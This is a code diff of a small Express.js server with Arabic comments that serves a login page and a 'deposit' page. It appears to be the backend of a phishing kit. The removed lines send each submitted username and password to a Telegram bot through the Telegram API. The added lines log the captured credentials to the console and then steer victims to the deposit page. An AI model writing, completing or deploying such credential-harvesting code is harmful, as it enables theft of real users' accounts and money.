@@ -1,55 +1,30 @@
-const express = require("express");
-const axios = require("axios");
-const path = require("path");
-
+const express = require('express');
+const path = require('path');
 const app = express();
-const PORT = process.env.PORT || 8080;
 
+// إعدادات ضرورية لاستقبال البيانات من الصفحة
 app.use(express.json());
 app.use(express.urlencoded({ extended: true }));
+app.use(express.static('.'));
 
-const indexPath = path.join(__dirname, "index.html");
-
-app.get("/", (_req, res) => {
-  res.sendFile(indexPath);
+// عرض صفحة تسجيل الدخول الرئيسية
+app.get('/', (req, res) => {
+    res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-app.post("/login", async (req, res) => {
-  const { username, password } = req.body;
+// عرض صفحة الإيداع
+app.get('/deposit', (req, res) => {
+    res.sendFile(path.join(__dirname, 'deposit.html'));
+});
 
-  if (!username || !password) {
-    res.status(400).json({ error: "Missing username or password" });
-    return;
-  }
-
-  const botToken = process.env.TELEGRAM_BOT_TOKEN;
-  const chatId = process.env.TELEGRAM_CHAT_ID;
-
-  if (!botToken || !chatId) {
-    console.error("Telegram credentials are not set in Secrets.");
-    res.status(500).json({ error: "Telegram credentials not configured" });
-    return;
-  }
-
-  const message = `New Login:\nUsername: ${username}\nPassword: ${password}`;
-
-  try {
-    await axios.post(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      chat_id: chatId,
-      text: message,
-    });
-
+// استقبال بيانات الدخول والتحويل لصفحة الإيداع
+app.post('/login', (req, res) => {
+    const { username, password } = req.body;
+    console.log(`بيانات دخول جديدة: ${username} | ${password}`);
+    // نرسل رد بالنجاح لكي يقوم المتصفح بالتحويل
     res.json({ success: true });
-  } catch (err) {
-    console.error("Telegram API error:", err.response?.data || err.message);
-    res.status(500).json({ error: "Failed to send to Telegram" });
-  }
 });
 
-app.get(/(.*)/, (_req, res) => {
-  res.sendFile(indexPath);
-});
-
-app.listen(PORT, "0.0.0.0", () => {
-  console.log(`Server running on http://0.0.0.0:${PORT}`);
+app.listen(8080, '0.0.0.0', () => {
+    console.log('السيرفر يعمل الآن على منفذ 8080');
 });
